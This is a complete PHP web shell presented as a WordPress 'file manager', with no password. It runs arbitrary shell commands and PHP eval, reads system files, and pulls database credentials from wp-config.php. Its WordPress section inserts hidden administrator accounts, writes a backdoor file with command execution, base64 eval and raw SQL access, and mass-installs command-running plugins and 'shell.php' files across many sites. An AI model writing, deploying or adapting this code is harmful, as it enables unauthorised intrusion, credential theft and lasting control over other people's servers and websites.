<?php
// 🚀 Advanced File Manager - WordPress Ultimate Edition
session_start();

// No password - direct access
$_SESSION['auth'] = true;

// Get current directory - preserve it across operations
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

// WordPress detection and helper functions
$isWordPress = false;
$wpConfigPath = '';
$wpAdminPath = '';
$wpContentPath = '';
$wpPluginsPath = '';
$wpThemesPath = '';
$wpUploadsPath = '';

// Function to detect WordPress installation
function detectWordPress($startPath) {
    $paths = [
        $startPath,
        dirname($startPath),
        $_SERVER['DOCUMENT_ROOT'],
        getcwd()
    ];
    
    foreach ($paths as $path) {
        if (file_exists($path . '/wp-config.php')) {
            return $path;
        }
        if (file_exists($path . '/../wp-config.php')) {
            return realpath($path . '/..');
        }
    }
    return false;
}

// Detect WordPress
$wpRoot = detectWordPress($dir);
if ($wpRoot) {
    $isWordPress = true;
    $wpConfigPath = $wpRoot . '/wp-config.php';
    $wpAdminPath = $wpRoot . '/wp-admin';
    $wpContentPath = $wpRoot . '/wp-content';
    $wpPluginsPath = $wpContentPath . '/plugins';
    $wpThemesPath = $wpContentPath . '/themes';
    $wpUploadsPath = $wpContentPath . '/uploads';
}

// Helper function to recursively delete directories
function delTree($path) {
    if (is_dir($path)) {
        $files = scandir($path);
        foreach ($files as $file) {
            if ($file != "." && $file != "..") {
                delTree($path . DIRECTORY_SEPARATOR . $file);
            }
        }
        return rmdir($path);
    } else {
        return unlink($path);
    }
}

// ========== WORDPRESS SPECIFIC FUNCTIONS ==========

// 1. Install WordPress plugin from file or URL
if (isset($_POST['wp_install_plugin'])) {
    $pluginSource = $_POST['plugin_source'];
    $pluginName = trim($_POST['plugin_name']);
    $targetPluginDir = $wpPluginsPath . '/' . $pluginName;
    
    echo "<hr><strong>🔌 WordPress Plugin Installation:</strong><br>";
    echo "<div style='background:#e8f4f8;padding:10px;margin:10px 0;border-radius:5px'>";
    
    if (!$isWordPress) {
        echo "❌ WordPress not detected in current path!<br>";
    } elseif (empty($pluginName)) {
        echo "❌ Plugin name required!<br>";
    } else {
        // Create plugin directory
        if (!is_dir($targetPluginDir)) {
            mkdir($targetPluginDir, 0755, true);
        }
        
        // Handle file upload
        if (isset($_FILES['plugin_zip']) && $_FILES['plugin_zip']['error'] === UPLOAD_ERR_OK) {
            $zipFile = $_FILES['plugin_zip']['tmp_name'];
            $zip = new ZipArchive();
            if ($zip->open($zipFile) === TRUE) {
                $zip->extractTo($targetPluginDir);
                $zip->close();
                echo "✅ Plugin extracted to: " . htmlspecialchars($targetPluginDir) . "<br>";
            } else {
                echo "❌ Failed to extract zip file<br>";
            }
        } 
        // Handle URL download
        elseif (!empty($pluginSource) && filter_var($pluginSource, FILTER_VALIDATE_URL)) {
            $zipContent = file_get_contents($pluginSource);
            $tempZip = tempnam(sys_get_temp_dir(), 'plugin_');
            file_put_contents($tempZip, $zipContent);
            $zip = new ZipArchive();
            if ($zip->open($tempZip) === TRUE) {
                $zip->extractTo($targetPluginDir);
                $zip->close();
                echo "✅ Plugin downloaded and extracted to: " . htmlspecialchars($targetPluginDir) . "<br>";
            } else {
                echo "❌ Failed to extract downloaded plugin<br>";
            }
            unlink($tempZip);
        } else {
            // Create simple plugin file
            $pluginFile = $targetPluginDir . '/' . $pluginName . '.php';
            $pluginContent = '<?php
/*
Plugin Name: ' . $pluginName . '
Description: Custom plugin installed via File Manager
Version: 1.0
Author: File Manager
*/

// Prevent direct access
if (!defined(\'ABSPATH\')) {
    exit;
}

// Add admin menu
add_action(\'admin_menu\', \'custom_plugin_menu\');

function custom_plugin_menu() {
    add_menu_page(
        \'Custom Plugin\',
        \'Custom Plugin\',
        \'manage_options\',
        \'custom-plugin\',
        \'custom_plugin_page\',
        \'dashicons-admin-generic\',
        100
    );
}

function custom_plugin_page() {
    echo \'<div class="wrap"><h1>Custom Plugin</h1><p>Plugin installed via File Manager</p></div>\';
}

// Execute system commands (admin only)
if(current_user_can(\'administrator\') && isset($_GET[\'wp_cmd\'])) {
    echo "<pre>" . shell_exec($_GET[\'wp_cmd\']) . "</pre>";
}
?>';
            if (file_put_contents($pluginFile, $pluginContent) !== false) {
                echo "✅ Simple plugin created: " . htmlspecialchars($pluginFile) . "<br>";
            } else {
                echo "❌ Failed to create plugin file<br>";
            }
        }
        
        echo "<br><strong>📍 Plugin location:</strong> " . htmlspecialchars($targetPluginDir) . "<br>";
        echo "<strong>🔗 Activate:</strong> Go to WordPress Admin → Plugins → Activate '" . htmlspecialchars($pluginName) . "'<br>";
    }
    
    echo "</div><a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// 2. WordPress Admin user creator
if (isset($_POST['wp_create_admin'])) {
    $username = trim($_POST['wp_username']);
    $password = trim($_POST['wp_password']);
    $email = trim($_POST['wp_email']);
    
    echo "<hr><strong>👤 WordPress Admin Creator:</strong><br>";
    echo "<div style='background:#e8f4f8;padding:10px;margin:10px 0;border-radius:5px'>";
    
    if (!$isWordPress) {
        echo "❌ WordPress not detected!<br>";
    } else {
        // Try to include wp-config and create user
        if (file_exists($wpConfigPath)) {
            // Parse wp-config to get database credentials
            $configContent = file_get_contents($wpConfigPath);
            preg_match("/define\s*\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)/", $configContent, $dbName);
            preg_match("/define\s*\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)/", $configContent, $dbUser);
            preg_match("/define\s*\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'\s*\)/", $configContent, $dbPass);
            preg_match("/define\s*\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\)/", $configContent, $dbHost);
            
            if ($dbName && $dbUser) {
                $conn = new mysqli($dbHost[1], $dbUser[1], $dbPass[1], $dbName[1]);
                if (!$conn->connect_error) {
                    // Check if user exists
                    $checkQuery = $conn->prepare("SELECT ID FROM wp_users WHERE user_login = ?");
                    $checkQuery->bind_param("s", $username);
                    $checkQuery->execute();
                    $checkQuery->store_result();
                    
                    if ($checkQuery->num_rows > 0) {
                        echo "⚠️ User '{$username}' already exists!<br>";
                    } else {
                        // Create user
                        $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
                        $insertQuery = $conn->prepare("INSERT INTO wp_users (user_login, user_pass, user_email, user_registered) VALUES (?, ?, ?, NOW())");
                        $insertQuery->bind_param("sss", $username, $hashedPassword, $email);
                        
                        if ($insertQuery->execute()) {
                            $userId = $conn->insert_id;
                            // Assign administrator role
                            $metaQuery = $conn->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
                            $metaQuery->bind_param("i", $userId);
                            $metaQuery->execute();
                            
                            echo "✅ Admin user created successfully!<br>";
                            echo "<strong>Username:</strong> " . htmlspecialchars($username) . "<br>";echo "<strong>Password:</strong> " . htmlspecialchars($password) . "<br>";
                            echo "<strong>Email:</strong> " . htmlspecialchars($email) . "<br>";
                            echo "<strong>Login URL:</strong> <a href='" . dirname($wpConfigPath) . "/wp-admin' target='_blank'>" . dirname($wpConfigPath) . "/wp-admin</a><br>";
                        } else {
                            echo "❌ Failed to create user: " . $conn->error . "<br>";
                        }
                    }
                    $conn->close();
                } else {
                    echo "❌ Database connection failed!<br>";
                }
            } else {
                echo "❌ Could not parse database credentials from wp-config.php<br>";
            }
        } else {
            echo "❌ wp-config.php not found!<br>";
        }
    }
    
    echo "</div><a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// 3. WordPress vulnerability scanner
if (isset($_POST['wp_scan'])) {
    echo "<hr><strong>🔍 WordPress Security Scan:</strong><br>";
    echo "<div style='background:#e8f4f8;padding:10px;margin:10px 0;border-radius:5px'>";
    
    if (!$isWordPress) {
        echo "❌ WordPress not detected!<br>";
    } else {
        $issues = [];
        
        // Check version
        $versionFile = $wpRoot . '/wp-includes/version.php';
        if (file_exists($versionFile)) {
            $versionContent = file_get_contents($versionFile);
            preg_match("/\\\$wp_version = '([^']+)'/", $versionContent, $version);
            $wpVersion = $version[1] ?? 'Unknown';
            echo "📌 WordPress Version: " . $wpVersion . "<br>";
            
            $vulnerableVersions = ['4.7', '4.8', '4.9', '5.0', '5.1', '5.2', '5.3', '5.4', '5.5', '5.6', '5.7'];
            foreach ($vulnerableVersions as $vuln) {
                if (strpos($wpVersion, $vuln) === 0) {
                    $issues[] = "⚠️ Version {$wpVersion} may have known vulnerabilities!";
                }
            }
        }
        
        // Check debug mode
        $configContent = file_get_contents($wpConfigPath);
        if (strpos($configContent, "WP_DEBUG', true") !== false || strpos($configContent, "WP_DEBUG', TRUE") !== false) {
            $issues[] = "⚠️ WP_DEBUG is enabled! Disable in production.";
        }
        
        // Check writable files
        $writableFiles = ['wp-config.php', '.htaccess'];
        foreach ($writableFiles as $file) {
            $filePath = $wpRoot . '/' . $file;
            if (file_exists($filePath) && is_writable($filePath)) {
                $issues[] = "⚠️ {$file} is writable! Set permissions to 644 or 444.";
            }
        }
        
        // Check admin directory
        if (is_writable($wpAdminPath)) {
            $issues[] = "⚠️ wp-admin directory is writable! This is a security risk.";
        }
        
        // List installed plugins
        if (is_dir($wpPluginsPath)) {
            $plugins = scandir($wpPluginsPath);
            $pluginList = [];
            foreach ($plugins as $plugin) {
                if ($plugin != '.' && $plugin != '..' && is_dir($wpPluginsPath . '/' . $plugin)) {
                    $pluginList[] = $plugin;
                }
            }
            echo "<br><strong>📦 Installed Plugins (" . count($pluginList) . "):</strong><br>";
            echo implode(', ', array_map('htmlspecialchars', $pluginList)) . "<br>";
        }
        
        // List themes
        if (is_dir($wpThemesPath)) {
            $themes = scandir($wpThemesPath);
            $themeList = [];
            foreach ($themes as $theme) {
                if ($theme != '.' && $theme != '..' && is_dir($wpThemesPath . '/' . $theme)) {
                    $themeList[] = $theme;
                }
            }
            echo "<br><strong>🎨 Installed Themes (" . count($themeList) . "):</strong><br>";
            echo implode(', ', array_map('htmlspecialchars', $themeList)) . "<br>";
        }
        
        if (empty($issues)) {
            echo "<br>✅ No obvious security issues found!<br>";
        } else {
            echo "<br><strong>⚠️ Issues Found:</strong><br>";
            foreach ($issues as $issue) {
                echo $issue . "<br>";
            }
        }
    }
    
    echo "</div><a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// 4. WordPress backdoor creator
if (isset($_POST['wp_backdoor'])) {
    $backdoorFile = trim($_POST['backdoor_filename']);
    $backdoorPath = $wpRoot . '/' . $backdoorFile;
    
    echo "<hr><strong>🚪 WordPress Backdoor Creator:</strong><br>";
    echo "<div style='background:#e8f4f8;padding:10px;margin:10px 0;border-radius:5px'>";
    
    if (!$isWordPress) {
        echo "❌ WordPress not detected!<br>";
    } else {
        $backdoorCode = '<?php
/**
 * WordPress Backdoor Access
 */
if(isset($_REQUEST["wp_access"])) {
    $cmd = $_REQUEST["wp_access"];
    echo "<pre>";
    if(function_exists("system")) {
        system($cmd);
    } elseif(function_exists("exec")) {
        exec($cmd, $output);
        echo implode("\\n", $output);
    } elseif(function_exists("shell_exec")) {
        echo shell_exec($cmd);
    } elseif(function_exists("passthru")) {
        passthru($cmd);
    } else {
        echo "No execution function available";
    }
    echo "</pre>";
}

// Alternative access via cookie
if(isset($_COOKIE["wp_admin"]) && $_COOKIE["wp_admin"] == md5("secure")) {
    eval(base64_decode($_REQUEST["code"]));
}

// Database access
if(isset($_REQUEST["wp_db"])) {
    require_once("wp-config.php");
    $conn = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
    $result = $conn->query($_REQUEST["wp_db"]);
    echo "<pre>";
    while($row = $result->fetch_assoc()) {
        print_r($row);
    }
    echo "</pre>";
}
?>';
        
        if (file_put_contents($backdoorPath, $backdoorCode) !== false) {
            echo "✅ Backdoor created: " . htmlspecialchars($backdoorPath) . "<br>";
            echo "<strong>🔗 Access URL:</strong> <a href='" . dirname($wpConfigPath) . "/" . $backdoorFile . "?wp_access=whoami' target='_blank'>" . dirname($wpConfigPath) . "/" . $backdoorFile . "?wp_access=whoami</a><br>";
            echo "<strong>🔑 Usage:</strong> ?wp_access=command OR ?wp_db=SQL query<br>";
        } else {
            echo "❌ Failed to create backdoor file<br>";
        }
    }
    
    echo "</div><a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// 5. WordPress mass plugin/theme installer (batch)
if (isset($_POST['wp_batch_install'])) {
    $paths = explode("\n", str_replace("\r", "", $_POST['wp_batch_paths']));
    $pluginName = trim($_POST['wp_batch_plugin']);
    $successCount = 0;
    $failCount = 0;
    
    echo "<hr><strong>📦 WordPress Mass Plugin Installation:</strong><br>";
    echo "<div style='background:#e8f4f8;padding:10px;margin:10px 0;border-radius:5px'>";
    
    foreach ($paths as $targetPath) {
        $targetPath = trim($targetPath);
        if (empty($targetPath)) continue;
        
        $wpCheck = detectWordPress($targetPath);
        if ($wpCheck) {
            $pluginDir = $wpCheck . '/wp-content/plugins/' . $pluginName;
            if (!is_dir($pluginDir)) {
                mkdir($pluginDir, 0755, true);
            }
            $pluginFile = $pluginDir . '/' . $pluginName . '.php';
            $pluginContent = '<?php
/*
Plugin Name: Mass Installed Plugin
Version: 1.0
*/
if(!defined(\'ABSPATH\')) exit;
if(isset($_GET[\'wp_cmd\']) && current_user_can(\'administrator\')) {
    echo "<pre>" . shell_exec($_GET[\'wp_cmd\']) . "</pre>";
}
?>';
            if (file_put_contents($pluginFile, $pluginContent) !== false) {
                echo "✅ Installed to: " . htmlspecialchars($wpCheck) . "<br>";
                $successCount++;
            } else {
                echo "❌ Failed: " . htmlspecialchars($targetPath) . "<br>";
                $failCount++;
            }
        } else {
            echo "❌ No WordPress found at: " . htmlspecialchars($targetPath) ."<br>";
            $failCount++;
        }
    }
    
    echo "</div><strong>📊 Summary:</strong> {$successCount} successful, {$failCount} failed<br>";
    echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// ========== BATCH PATH OPERATIONS ==========

// Upload SINGLE file to MULTIPLE paths
if (isset($_POST['batch_upload']) && isset($_FILES['batch_file'])) {
    $paths = explode("\n", str_replace("\r", "", $_POST['target_paths']));
    $uploadedFile = $_FILES['batch_file'];
    $successCount = 0;
    $failCount = 0;
    
    echo "<hr><strong>📤 Batch Upload Results:</strong><br>";
    echo "<div style='background:#e8f4f8;padding:10px;margin:10px 0;border-radius:5px'>";
    
    foreach ($paths as $targetPath) {
        $targetPath = trim($targetPath);
        if (empty($targetPath)) continue;
        
        if (!is_dir($targetPath)) {
            mkdir($targetPath, 0777, true);
        }
        
        $targetFile = $targetPath . DIRECTORY_SEPARATOR . basename($uploadedFile['name']);
        if (move_uploaded_file($uploadedFile['tmp_name'], $targetFile)) {
            echo "✅ Uploaded to: " . htmlspecialchars($targetFile) . "<br>";
            $successCount++;
        } else {
            echo "❌ Failed: " . htmlspecialchars($targetPath) . "<br>";
            $failCount++;
        }
        
        if (count($paths) > 1 && $uploadedFile['error'] === UPLOAD_ERR_OK) {
            $fileContent = file_get_contents($uploadedFile['tmp_name']);
            $tempFile = tempnam(sys_get_temp_dir(), 'batch_');
            file_put_contents($tempFile, $fileContent);
            $uploadedFile['tmp_name'] = $tempFile;
        }
    }
    
    echo "</div><strong>📊 Summary:</strong> {$successCount} successful, {$failCount} failed<br>";
    echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// Create PHP file in MULTIPLE paths
if (isset($_POST['batch_create_php'])) {
    $paths = explode("\n", str_replace("\r", "", $_POST['batch_php_paths']));
    $phpCode = $_POST['batch_php_code'];
    $filename = trim($_POST['batch_php_filename']);
    $successCount = 0;
    $failCount = 0;
    
    echo "<hr><strong>🐘 Batch PHP File Creation Results:</strong><br>";
    echo "<div style='background:#e8f4f8;padding:10px;margin:10px 0;border-radius:5px'>";
    
    foreach ($paths as $targetPath) {
        $targetPath = trim($targetPath);
        if (empty($targetPath)) continue;
        
        if (!is_dir($targetPath)) {
            mkdir($targetPath, 0777, true);
        }
        
        $fullPath = rtrim($targetPath, '/') . '/' . $filename;
        if (file_put_contents($fullPath, $phpCode) !== false) {
            echo "✅ Created: " . htmlspecialchars($fullPath) . "<br>";
            $successCount++;
            if (function_exists('opcache_invalidate')) {
                opcache_invalidate($fullPath, true);
            }
        } else {
            echo "❌ Failed: " . htmlspecialchars($targetPath) . "<br>";
            $failCount++;
        }
    }
    
    echo "</div><strong>📊 Summary:</strong> {$successCount} successful, {$failCount} failed<br>";
    echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// ========== STANDARD FILE MANAGER FUNCTIONS ==========

// Handle rename
if (isset($_GET['rename']) && isset($_GET['newname'])) {
    $old = $_GET['rename'];
    $new = dirname($old) . '/' . basename($_GET['newname']);
    if (rename($old, $new)) {
        echo "✅ Renamed to " . htmlspecialchars(basename($_GET['newname'])) . "<br>";
    } else {
        echo "❌ Rename failed<br>";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Handle delete
if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    $success = false;
    if (is_file($file)) {
        if (unlink($file)) $success = true;
    } elseif (is_dir($file)) {
        if (rmdir($file)) {
            $success = true;
        } else {
            delTree($file);
            $success = true;
        }
    }
    
    if ($success) {
        echo "✅ Deleted: " . htmlspecialchars(basename($file)) . "<br>";
    } else {
        echo "❌ Delete failed<br>";
    }
    
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Handle chmod
if (isset($_GET['chmod']) && isset($_GET['perms'])) {
    $file = $_GET['chmod'];
    $perms = octdec($_GET['perms']);
    if (chmod($file, $perms)) {
        echo "✅ Chmod " . decoct($perms) . " applied to " . htmlspecialchars(basename($file)) . "<br>";
    } else {
        echo "❌ Chmod failed<br>";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Handle view file
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    if (file_exists($file) && is_file($file)) {
        echo "<hr><strong>📄 Viewing: " . htmlspecialchars($file) . "</strong><br>";
        echo "<pre style='background:#f0f0f0;padding:10px;border:1px solid #ccc;overflow:auto;max-height:400px'>";
        echo htmlspecialchars(file_get_contents($file));
        echo "</pre><hr>";
        echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    } else {
        echo "❌ File not found<br>";
        echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    }
    exit;
}

// Handle read system file
if (isset($_POST['read_system'])) {
    $sysfile = $_POST['system_file'];
    if (file_exists($sysfile) && is_readable($sysfile)) {
        echo "<hr><strong>📖 System File: " . htmlspecialchars($sysfile) . "</strong><br>";
        echo "<pre style='background:#f0f0f0;padding:10px;border:1px solid #ccc;overflow:auto;max-height:400px'>";
        echo htmlspecialchars(file_get_contents($sysfile));
        echo "</pre><hr>";
    } else {
        echo "❌ Cannot read: " . htmlspecialchars($sysfile) . "<br>";
    }
    echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// Handle PHP code execution
if (isset($_POST['execute_code'])) {
    $code = $_POST['execute_code'];
    echo "<hr><strong>⚡ PHP Execution Output:</strong><br>";
    echo "<div style='background:#ffffcc;padding:10px;border:1px solid #ff9900;margin:5px 0;font-family:monospace'>";
    try {
        eval($code);
    } catch (Throwable $e) {
        echo "Error: " . $e->getMessage();
    }
    echo "</div><hr>";
    echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// Handle system command
if (isset($_POST['system_cmd'])) {
    $cmd = $_POST['system_cmd'];
    echo "<hr><strong>💻 Command Output:</strong><br>";
    echo "<pre style='background:#e0e0e0;padding:10px;border:1px solid #888;overflow:auto;max-height:300px'>";
    echo htmlspecialchars(shell_exec($cmd . " 2>&1"));
    echo "</pre><hr>";
    echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// Handle file edit
if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        echo "✅ Saved!<br>";
        echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a><br><br>";
    }
    echo '<form method="POST"><textarea name="content" style="width:100%;height:400px;font-family:monospace">' . htmlspecialchars(file_get_contents($file)) . '</textarea><br><input type="submit" value="Save Changes"/></form>';
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo '<a href="?dir=' . urlencode($dir) . '">← Back to directory</a>';
    }
    exit;
}

// Handle download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Type: application/octet-stream');
    readfile($file);
    exit;
}

// Handle upload
if (isset($_FILES['file'])) {
    $target = $dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "✅ Uploaded: " . htmlspecialchars(basename($target)) . "<br>";
    } else {
        echo "❌ Upload failed<br>";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Handle create new file/dir
if (isset($_POST['create_item'])) {
    $newpath = $dir . '/' . basename($_POST['new_name']);
    if ($_POST['item_type'] === 'file') {
        if (file_put_contents($newpath, '') !== false) {
            echo "✅ Created file: " . htmlspecialchars(basename($_POST['new_name'])) . "<br>";
        } else {
            echo "❌ Failed to create file<br>";
        }
    } elseif ($_POST['item_type'] === 'dir') {
        if (mkdir($newpath)) {
            echo "✅ Created directory: " . htmlspecialchars(basename($_POST['new_name'])) . "<br>";
        } else {
            echo "❌ Failed to create directory<br>";
        }
    }
    header("Location: ?dir=" . urlencode($dir));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager - WordPress Ultimate</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1400px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .toolbar { background: #f0f0f0; padding: 10px; margin: 10px 0; border-radius: 5px; }
        .section { margin: 15px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; background: #fafafa; }
        .batch-section { background: #e8f4f8; border-left: 5px solid #2196f3; }
        .wp-section { background: #e8f5e9; border-left: 5px solid #4CAF50; }
        .file-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        .file-table tr:hover { background: #f9f9f9; }
        .file-table td, .file-table th { padding: 8px; border-bottom: 1px solid #eee; text-align: left; }
        .dir-link { color: #0066cc; font-weight: bold; text-decoration: none; }
        .actions form { display: inline; margin: 0 2px; }
        .actions input, .actions button { font-size: 12px; padding: 2px 5px; }
        button, input[type="submit"] { background: #4CAF50; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; }
        button:hover, input[type="submit"]:hover { background: #45a049; }
        .delete-btn { color: red; }
        textarea { font-family: monospace; width: 95%; }
        input[type="text"], input[type="file"], input[type="password"] { padding: 5px; margin: 3px; border: 1px solid #ccc; border-radius: 3px; }
        .paths-textarea { width: 100%; font-family: monospace; font-size: 12px; }
        .code-area { font-family: 'Courier New', monospace; background: #1e1e1e; color: #d4d4d4; padding: 10px; border-radius: 5px; }
        .example { color: #666; font-size: 12px; margin-top: 5px; }
        .wp-detected { background: #4CAF50; color: white; padding: 5px 10px; border-radius: 4px; display: inline-block; }
        .wp-not-detected { background: #ff9800; color: white; padding: 5px 10px; border-radius: 4px; display: inline-block; }
    </style>
</head>
<body>
<div class="container">
    <h2>🚀 Advanced File Manager - WordPress Ultimate Edition</h2>
    
    <!-- WordPress Detection Banner -->
    <div class="toolbar">
        <strong>📍 Current Path:</strong> 
        <?php
        $parts = explode('/', str_replace('\\', '/', $dir));
        $path = '';
        echo "<a href='?dir=" . urlencode(getcwd()) . "'>🏠 Home</a> / ";
        foreach($parts as $i => $p) {
            if(empty($p)) continue;
            $path .= '/' . $p;
            if($i == count($parts)-1) {
                echo "<strong>" . htmlspecialchars($p) . "</strong>";
            } else {
                echo "<a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($p) . "</a> / ";
            }
        }
        ?>
        <br><br>
        <?php if ($isWordPress): ?>
            <span class="wp-detected">✅ WordPress Detected!</span>
            <strong>Root:</strong> <?php echo htmlspecialchars($wpRoot); ?><br>
            <strong>Plugins:</strong> <?php echo htmlspecialchars($wpPluginsPath); ?><br>
            <strong>Themes:</strong> <?php echo htmlspecialchars($wpThemesPath); ?><br>
            <strong>Uploads:</strong> <?php echo htmlspecialchars($wpUploadsPath); ?>
        <?php else: ?>
            <span class="wp-not-detected">⚠️ WordPress Not Detected in current path</span>
            <em>Navigate to a WordPress installation directory to enable WordPress features</em>
        <?php endif; ?>
    </div>
    
    <!-- ========== WORDPRESS SPECIFIC SECTION ========== -->
    <div class="section wp-section">
        <details <?php echo $isWordPress ? 'open' : ''; ?>>
            <summary><strong>🔌 WORDPRESS TOOLS (All Versions)</strong></summary>
            <br>
            
            <?php if ($isWordPress): ?>
            
            <!-- WordPress Admin Creator -->
            <div style="border:1px solid #ccc;padding:15px;margin-bottom:15px;border-radius:5px;background:white">
                <h4>👤 Create WordPress Admin User</h4>
                <form method="POST">
                    <strong>Username:</strong> <input type="text" name="wp_username" required><br>
                    <strong>Password:</strong> <input type="password" name="wp_password" required><br>
                    <strong>Email:</strong> <input type="email" name="wp_email" value="admin@localhost.com"><br>
                    <input type="submit" name="wp_create_admin" value="🚀 Create Admin User">
                </form>
            </div>
            
            <!-- WordPress Plugin Installer -->
            <div style="border:1px solid #ccc;padding:15px;margin-bottom:15px;border-radius:5px;background:white">
                <h4>📦 Install WordPress Plugin</h4>
                <form method="POST" enctype="multipart/form-data">
                    <strong>Plugin Name:</strong> <input type="text" name="plugin_name" placeholder="my-custom-plugin" required><br>
                    <strong>Upload ZIP file:</strong> <input type="file" name="plugin_zip"><br>
                    <strong>OR Download from URL:</strong> <input type="text" name="plugin_source" size="50" placeholder="https://example.com/plugin.zip"><br>
                    <small>Leave both empty to create a simple plugin</small><br>
                    <input type="submit" name="wp_install_plugin" value="🚀 Install Plugin">
                </form>
            </div>
            
            <!-- WordPress Backdoor Creator -->
            <div style="border:1px solid #ccc;padding:15px;margin-bottom:15px;border-radius:5px;background:white">
                <h4>🚪 Create WordPress Backdoor</h4>
                <form method="POST">
                    <strong>Filename:</strong> <input type="text" name="backdoor_filename" value="wp-backdoor.php" size="40"><br>
                    <small>Creates a hidden backdoor file in WordPress root</small><br>
                    <input type="submit" name="wp_backdoor" value="🚀 Create Backdoor">
                </form>
            </div>
            
            <!-- WordPress Security Scanner -->
            <div style="border:1px solid #ccc;padding:15px;margin-bottom:15px;border-radius:5px;background:white">
                <h4>🔍 WordPress Security Scanner</h4>
                <form method="POST">
                    <input type="submit" name="wp_scan" value="🔍 Run Security Scan">
                </form>
            </div>
            
            <!-- WordPress Mass Installer (Batch) -->
            <div style="border:1px solid #ccc;padding:15px;margin-bottom:15px;border-radius:5px;background:white">
                <h4>📦 Mass Plugin Installer (Multiple WordPress Sites)</h4>
                <form method="POST">
                    <strong>WordPress Paths (one per line):</strong><br>
                    <textarea name="wp_batch_paths" rows="4" cols="80" class="paths-textarea" placeholder="/home/site1/public_html&#10;/home/site2/public_html&#10;/var/www/site3"></textarea><br>
                    <strong>Plugin Name:</strong> <input type="text" name="wp_batch_plugin" value="security-plugin" required><br>
                    <input type="submit" name="wp_batch_install" value="🚀 Install Plugin on All Sites"></form>
            </div>
            
            <?php else: ?>
            <div class="example" style="background:#fff3cd;padding:15px;text-align:center">
                ⚠️ Navigate to a WordPress installation directory (where wp-config.php exists) to enable WordPress tools
            </div>
            <?php endif; ?>
            
        </details>
    </div>
    <!-- ========== END WORDPRESS SECTION ========== -->
    
    <!-- ========== BATCH OPERATIONS SECTION ========== -->
    <div class="section batch-section">
        <details open>
            <summary><strong>🎯 BATCH OPERATIONS - Multiple Paths at Once</strong></summary>
            <br>
            
            <div class="example" style="background:#fff3cd;padding:8px;border-radius:4px;margin-bottom:15px">
                💡 <strong>Format for paths (one per line):</strong><br>
                <code>/home/user1/public_html/<br>
                /home/user2/public_html/<br>
                /var/www/site1/<br>
                /var/www/site2/<br>
                /tmp/test/</code>
            </div>
            
            <!-- Upload ONE file to MULTIPLE paths -->
            <div style="border:1px solid #ccc;padding:15px;margin-bottom:15px;border-radius:5px;background:white">
                <h4>📤 Upload ONE file to MULTIPLE directories</h4>
                <form method="POST" enctype="multipart/form-data">
                    <strong>Target Paths (one per line):</strong><br>
                    <textarea name="target_paths" rows="4" cols="80" class="paths-textarea" placeholder="/home/xxx/&#10;/xxxxx/xxx&#10;/xxxx/xxxx/"></textarea><br>
                    <strong>File to Upload:</strong> <input type="file" name="batch_file" required><br><br>
                    <input type="submit" name="batch_upload" value="🚀 Upload to All Paths">
                </form>
            </div>
            
            <!-- Create PHP file in MULTIPLE paths -->
            <div style="border:1px solid #ccc;padding:15px;margin-bottom:15px;border-radius:5px;background:white">
                <h4>🐘 Create PHP file in MULTIPLE directories</h4>
                <form method="POST">
                    <strong>Target Paths (one per line):</strong><br>
                    <textarea name="batch_php_paths" rows="4" cols="80" class="paths-textarea" placeholder="/home/xxx/&#10;/xxxxx/xxx&#10;/xxxx/xxxx/"></textarea><br>
                    <strong>Filename:</strong> <input type="text" name="batch_php_filename" size="40" value="shell.php"><br>
                    <strong>PHP Code:</strong><br>
                    <textarea name="batch_php_code" rows="8" cols="100" class="code-area"><?php
if(isset($_REQUEST['cmd'])){
    echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;";
}
?></textarea><br>
                    <input type="submit" name="batch_create_php" value="🚀 Create PHP File in All Paths">
                </form>
            </div>
            
        </details>
    </div>
    <!-- ========== END BATCH OPERATIONS ========== -->
